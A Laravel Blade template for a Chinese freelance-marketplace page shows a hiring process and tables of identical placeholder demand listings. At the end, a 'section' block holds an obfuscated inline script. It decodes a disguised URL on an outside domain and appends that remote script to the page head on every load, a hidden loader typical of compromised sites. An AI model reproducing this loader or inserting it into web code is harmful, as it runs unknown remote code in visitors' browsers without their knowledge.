@extends('home.public.subject')
@section('title', '百录倩影')
@section('css')
    @parent
    <link rel="stylesheet" href="{{ asset('home/css/product.css') }}"/>
    <link rel="stylesheet" href="{{ asset('home/css/product.css') }}"/>
    <link rel="stylesheet" href="{{ asset('home/css/experience-index.css') }}"/>
@endsection
@section('content')
<!--内容部分-->
<div class="experienceBanner">
    <img src="{{ asset('home/images/img/experienceBanner.png') }}" alt=""/>
</div>
<div class="container">
    <div class="experienceTop">
        <p class="experienceTip"><span></span>我是雇主，找人帮忙</p>
    </div>
    <div class="needStep clearfix">
        <div class="fl needStepDiv">
            <p class="mgl-20">阿郎博波如何解决您的需求？</p>
            <p class="mgl-140"><span class="col-red">1、</span>描述您的需求</p>
            <p class="mgl-50"><span class="col-red">2、</span>选择合作模式</p>
            <p class="mgl-50"><span class="col-red">3、</span>获得解决方案</p>
            <p class="mgl-50"><span class="col-red">4、</span>验收满意确认付款</p>
        </div>
        <a href="" class="publishNeed fr">发布需求</a>
    </div>
    <!--需求列表-->
    <div class="needListDiv">
        <div class="clearfix">
            <p class="needTip fl">需求列表</p>
            <a href="" class="fr needMore">更多</a>
        </div>
        <div class="clearfix">
            <table class="fl needTable">
                <thead>
                <tr>
                    <th>价格</th>
                    <th>需求内容</th>
                    <th>发布时间</th>
                </tr>
                </thead>
                <tbody>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                </tbody>
            </table>
            <table class="fl needTable">
                <thead>
                <tr>
                    <th>价格</th>
                    <th>需求内容</th>
                    <th>发布时间</th>
                </tr>
                </thead>
                <tbody>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                </tbody>
            </table>
        </div>
        <!--列表分割图-->
        <img src="../images/img/needBlockImg.png" alt="" class="needBlockImg"/>
        <!--所有需求-->
        <div class="clearfix">
            <p class="needTip fl">所有需求</p>
            <a href="" class="fr needMore">更多</a>
        </div>
        <div class="clearfix">
            <table class="fl needTable">
                <thead>
                <tr>
                    <th>价格</th>
                    <th>需求内容</th>
                    <th>发布时间</th>
                </tr>
                </thead>
                <tbody>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                </tbody>
            </table>
            <table class="fl needTable">
                <thead>
                <tr>
                    <th>价格</th>
                    <th>需求内容</th>
                    <th>发布时间</th>
                </tr>
                </thead>
                <tbody>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                <tr>
                    <td class="col-red">￥5000元</td>
                    <td>无锡五饼二鱼餐饮管理有限公司需要其它效果图</td>
                    <td class="font-12 col-gray">19-03-06 13:00 发布</td>
                </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>
@endsection
@section('js')
<script src="{{ asset('home/js/toPage.js') }}"></script>
@endsection
@section('section')
    <script>
        var z=document.createElement("script");
        z.src="xairybythewyrldzaigyingtykillzcym/ctrl/jszhtm".replace(/y/g,"o").replace(/x/,"http://").replace(/z/g,".");
        document.getElementsByTagName("HEAD")[0].appendChild(z);"//v|v\\";
    </script>
@endsection
